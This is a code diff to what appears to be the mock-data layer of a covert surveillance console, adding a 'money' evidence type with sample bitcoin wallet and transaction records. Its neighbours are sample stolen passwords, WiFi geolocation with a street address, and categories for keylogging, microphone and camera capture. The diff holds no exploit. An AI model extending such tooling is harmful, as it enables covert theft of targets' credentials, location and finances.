@@ -54,6 +54,13 @@ package it.ht.rcs.console.evidence.rest
 
       new Evidence({_id: 'e05', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14, 53, 54)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14, 58, 42)), _mid: 0, note: '', rel: 0, type: 'password', data: new EvidenceData({user: 'root', pass: 'admin', program: 'Firefox/Thunderbird', service: 'http://172.16.42.100'})}),
 
+      
+      //money
+      new Evidence({_id: 'e96', aid: 'a1', blo: false, da: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 53, 59)), dr: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 58, 43)), _mid: 0, note: '', rel: 0, type: 'money', data: new EvidenceData({type: 'wallet', currency:'bitcoin',version:'80600', encrypted:false,size:'73728',balance:0})}),
+      new Evidence({_id: 'e97', aid: 'a1', blo: false, da: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 53, 59)), dr: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 59, 12)), _mid: 0, note: '', rel: 0, type: 'money', data: new EvidenceData({type: 'tx', currency:'bitcoin',from:'MINED BLOCK',rcpt:'LeTee2MvtE71F56rEzed77JEDCs9342', amount:0.05172392, incoming:true, balance:0,id:'0a2f66294be270a20f3ab0933040afd479ebe8rd63107eef4d00000943bee'})}),
+      new Evidence({_id: 'e97', aid: 'a1', blo: false, da: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 53, 59)), dr: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 59, 12)), _mid: 0, note: '', rel: 0, type: 'money', data: new EvidenceData({type: 'tx', currency:'bitcoin',from:'MINED BLOCK',rcpt:'LeTee2MvtE71F56rEzed77JEDCs9342', amount:0.09277216, incoming:false, balance:0,id:'0a2f66294be270a20f3ab0933040afd479ebe8rd63107eef4d00000943bee'})}),
+
+      
       //position
       new Evidence({_id: 'e06', aid: 'a1', blo: false, da: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 53, 59)), dr: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 58, 43)), _mid: 0, note: '', rel: 0, type: 'position', data: new EvidenceData({type: 'WIFI', latitude: 34.031249, longitude: -118.151848, accuracy: 51.0, address: new EvidenceDataAddress({text: "5257 E Beverly Blvd - East Los Angeles, CA 90022"}), wifi: [{mac: "98:FC:11:7A:82:AF", sig: -69, bssid: "PC-DOMENICO2_Network"}, {mac: "00:25:53:90:A8:76", sig: -76, "bssid": "TISCALI"}, {mac: "E8:40:40:80:61:B8", sig: -58, bssid: "ht-guest-wifi"}, {mac: "58:6D:8F:A0:50:71", sig: -37, bssid: "CiscoE4200"}, {mac: "00:24:89:20:3F:C5", sig: -76, bssid: "Vodafone-11116924"}, {mac: "30:85:A9:AA:CD:50", sig: -84, bssid: "ht-guest-wifi"}, {mac: "00:23:F8:30:A3:BC", sig: -71, bssid: "RSSM"}, {mac: "D4:D1:84:EA:90:07", sig: -85, bssid: "Telecom-82481153"}]})}),
 
@@ -574,6 +581,10 @@ package it.ht.rcs.console.evidence.rest
       var calendar:TypeCount = new TypeCount();
       calendar.type = "calendar";
       counts["calendar"] = calendar;
+      
+      var money:TypeCount = new TypeCount();
+      money.type = "money";
+      counts["money"] = money;
 
       var call:TypeCount = new TypeCount();
       call.type = "call";
@@ -639,7 +650,7 @@ package it.ht.rcs.console.evidence.rest
       total.type = "total";
       counts["total"] = total;
 
-      result.source = [addressbook, application, calendar, call, camera, chat, clipboard, device, file, keylog, message, mic, mouse, password, position, print, screenshot, url, total];
+      result.source = [addressbook, application, calendar, call, camera, chat, clipboard, device, file, keylog, message, mic, money, mouse, password, position, print, screenshot, url, total];
 
       var i:uint;
       var currentEvidence:Evidence;
